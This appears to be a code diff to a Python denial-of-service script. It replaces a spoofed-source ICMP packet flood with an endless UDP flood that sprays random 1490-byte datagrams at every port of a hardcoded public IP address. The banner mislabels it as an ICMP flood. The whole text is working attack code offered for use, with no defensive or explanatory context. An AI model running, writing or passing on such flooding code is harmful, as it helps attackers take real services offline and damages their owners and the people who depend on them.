@@ -60,27 +60,31 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-
+import sys
+import os
+import socket
 import random
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-def address_spoofer():
-    
-    addr = [192, 168, 0 , 1]
-    d = '.'
-    addr[0] = str(random.randrange(11,197))
-    addr[1] = str(random.randrange(0,255))
-    addr[2] = str(random.randrange(0,255))
-    addr[3] = str(random.randrange(2,254))
-    assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
-    print(assemebled)
-    return assemebled
+print('DDoS ICMP Flood Attack')
+print('Change IP in script')
+print()
+input('Hit enter to start, Ctrl+C to exit => ')
 
-target = input("Enter the target to attack: => ")
+# change ip here
+ip = "8.8.8.8"
+port = 1000
+sent = 0
+
 
 while True:
-
-    rand_addr = address_spoofer()
-    ip_hdr = IP(src=rand_addr, dst=target)
-    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
-    send(packet)
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
